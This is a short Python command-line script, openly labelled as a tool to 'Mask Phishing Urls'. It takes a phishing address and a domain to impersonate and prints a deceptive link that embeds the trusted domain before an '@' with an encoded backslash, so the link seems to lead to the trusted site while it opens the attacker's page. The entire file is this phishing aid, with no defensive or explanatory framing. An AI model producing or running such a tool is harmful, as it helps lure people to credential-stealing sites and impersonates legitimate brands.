import requests
import argparse

def maskUrl(url, spoof):

	phisher = f"https%5c{spoof}@{url}"
	return phisher

def Main():
	parser = argparse.ArgumentParser(description="Mask Phishing Urls")
	parser.add_argument("-u", "--url", help="specify phishing url")
	parser.add_argument("-m", "--mask", help="specify domain name to mask [https/http]")
	args = parser.parse_args()

	url = args.url
	mask = args.mask

	url = url.replace('https://', '')
	spoof = mask.replace('https://', '')

	phisher = maskUrl(url, spoof)

	print("[!] Phishing Url: " + phisher)

if __name__=="__main__":
	Main()
